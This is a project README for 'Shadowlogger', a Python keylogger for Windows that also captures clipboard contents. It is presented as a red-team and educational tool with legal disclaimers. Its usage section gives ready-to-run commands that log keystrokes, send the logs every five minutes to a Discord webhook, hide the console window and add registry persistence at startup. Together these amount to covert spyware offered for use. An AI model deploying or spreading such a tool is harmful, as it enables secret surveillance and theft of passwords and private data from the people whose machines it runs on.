# 🕵️ Shadowlogger

**Shadowlogger** is a lightweight, Python-based Windows keylogger and clipboard capture tool developed for **authorized Red Team simulations**, **cybersecurity research**, and **educational purposes only**.

> ⚠️ This tool is strictly for use in environments where you have **explicit permission**. Unauthorized usage is illegal and unethical.

---

## ✨ Features

- ✅ Logs keystrokes (including special keys like Enter, Shift, etc.)
- 📋 Captures clipboard data on `Ctrl + V` paste events
- 🌐 Optional exfiltration to a **user-supplied Discord webhook**
- 🛠️ Optional persistence via Windows registry (auto-run at startup)
- 👻 Optional stealth mode (hides the console window)
- 🔧 Fully configurable via command-line arguments (no hardcoded webhooks)
- 📦 Easy to extend, open-source


## ⚙️ Requirements

- Python 3.7+ (Windows only)
- Install dependencies with:

```bash
pip install -r requirements.txt
````

---

## 🚀 Usage

### 🔹 Basic Logging (no exfiltration)

```bash
python Shadowlogger.py
```

### 🔹 Remote Logging (Discord webhook)

```bash
python Shadowlogger.py --webhook https://discord.com/api/webhooks/your_webhook_url
```

### 🔹 With Stealth (no console window)

```bash
python Shadowlogger.py --webhook https://discord.com/api/webhooks/your_webhook_url --stealth
```

### 🔹 With Persistence (auto-start on boot)

```bash
python Shadowlogger.py --webhook https://discord.com/api/webhooks/your_webhook_url --stealth --persist
```

---

## 📤 What Gets Logged?

* Keystrokes → Saved in `syscache.log`
* Clipboard data → Saved in `clipdata.log`
* If webhook is passed, logs are sent every 5 minutes to your specified endpoint

---

## 🧠 Educational Use Cases

* Red Team simulation labs
* Malware behavior analysis
* Blue Team defense training
* Security awareness demos

---

## ❗️ Legal Disclaimer

This project is provided for:

* ✅ Educational purposes
* ✅ Ethical hacking training
* ✅ Authorized Red Teaming only

> ❌ The author does **not condone** illegal activity and is **not responsible** for misuse of this software.

---

## 🙌 Credits

Developed by \[Syed Sharjeel Zaidi]

GitHub:(https://github.com/syedsharjeelshah)
...
